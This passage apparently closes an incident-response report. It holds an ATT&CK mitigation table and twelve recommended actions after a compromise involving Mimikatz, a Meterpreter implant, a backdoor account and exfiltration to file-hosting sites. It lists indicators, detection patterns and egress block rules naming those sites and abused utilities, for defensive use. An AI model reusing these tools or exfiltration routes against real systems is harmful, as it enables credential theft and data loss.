| M1017 | User Training | Security Awareness Training | Conducted mandatory security awareness training for executives and administrative users focusing on password manager security, master password protection, and recognition of masqueraded files. | Reduces likelihood of storing master passwords in plaintext and improves recognition of malicious payloads. |
| M1041 | Encrypt Sensitive Information | Data at Rest Encryption | Implemented BitLocker encryption on administrative workstations. Deployed file-level encryption for sensitive financial and credential databases. Enforced KeePass key file usage instead of plaintext master passwords. | Protects stolen data from being useful to attackers even if exfiltrated and prevents plaintext master password storage. |
| M1054 | Software Configuration | Named Pipe Monitoring | Configured EDR to monitor and alert on named pipe creation matching Meterpreter patterns (msf-pipe-*). Implemented named pipe access control lists. | Detects Meterpreter C2 communication channels and prevents unauthorized named pipe creation. |
| M1042 | Disable or Remove Feature or Program | Restrict System Utilities | Restricted tar.exe, curl.exe, and robocopy.exe execution through application control policies. Deployed monitoring for cross-platform compression tools. | Prevents abuse of legitimate utilities for data compression, staging, and exfiltration. |
| M1031 | Network Intrusion Prevention | Network Egress Filtering | Blocked outbound connections to gofile.io, litter.catbox.moe, and similar temporary file hosting services. Implemented egress filtering for HTTP/HTTPS POST with multipart/form-data. | Prevents data exfiltration to anonymous cloud storage and payload downloads from temporary hosting services. |
| M1037 | Filter Network Traffic | RDP Access Restrictions | Restricted RDP access through jump servers with MFA. Implemented network segmentation isolating executive workstations from general user systems. | Limits lateral movement opportunities by enforcing strict access controls for remote desktop connections. |
| M1030 | Network Segmentation | VLAN Segmentation | Deployed VLAN segmentation between executive systems, administrative workstations, and general user endpoints with firewall rules enforcing least privilege access. | Compartmentalizes network to restrict lateral movement paths even with compromised credentials. |
| M1018 | User Account Management | Account Lockout Policy | Implemented stricter account lockout thresholds and account monitoring for suspicious creation patterns (e.g., username followed by digit). | Adds security layers to detect backdoor account creation and prevent credential stuffing attacks. |
| M1047 | Audit | Enhanced Logging | Enabled PowerShell script block logging, named pipe audit logging, and detailed file access auditing for password databases and staging directories. | Enables early detection of credential dumping, C2 communication, and data staging activities. |
| M1022 | Restrict File and Directory Permissions | Sensitive Directory Hardening | Removed write permissions to ProgramData for standard users. Implemented file integrity monitoring for credential storage locations and staging directories. | Prevents creation of hidden staging directories and detects unauthorized access to credential databases. |
| M1053 | Data Backup | Offline Backup Strategy | Implemented offline backup copies of KeePass databases and financial records stored separately from network-accessible locations. Verified backup integrity and restore procedures. | Ensures data recovery capability independent of compromised network systems and exfiltrated data. |
| M1049 | Antivirus/Antimalware | Enhanced Detection | Updated EDR signatures for Metasploit artifacts, Mimikatz variants, and renamed tool detection. Configured behavioral detection for DPAPI credential extraction. | Detects renamed security tools, credential dumping utilities, and C2 implants through behavioral analysis. |

---

The following response actions were recommended: (1) Isolating azuki-adminpc from the network to prevent ongoing C2 communication and data exfiltration; (2) Removing yuki.tanaka2 backdoor account and auditing all administrative group memberships; (3) Resetting yuki.tanaka account credentials and all passwords stored in the compromised KeePass database with mandatory MFA enrollment; (4) Deleting malicious artifacts including KB5044273-x64.7z payload, m.exe (Mimikatz), Meterpreter implant, and all staged archives; (5) Blocking network access to gofile.io (45.112.123.227) and litter.catbox.moe (162.159.130.233); (6) Implementing application control policies to prevent tar.exe, curl.exe, and robocopy.exe abuse; (7) Configuring named pipe monitoring and alerting for Meterpreter patterns; (8) Implementing RDP access restrictions through jump servers with MFA and network segmentation; (9) Deploying enhanced logging for credential access, named pipe creation, and staging directory activities; (10) Conducting mandatory security awareness training on password manager security and social engineering; (11) Enforcing KeePass key file usage and prohibiting plaintext master password storage; (12) Implementing offline backup strategy for credential databases and financial records stored separately from network-accessible locations to ensure recovery capability if online systems are destroyed or encrypted during follow-up attacks.

---
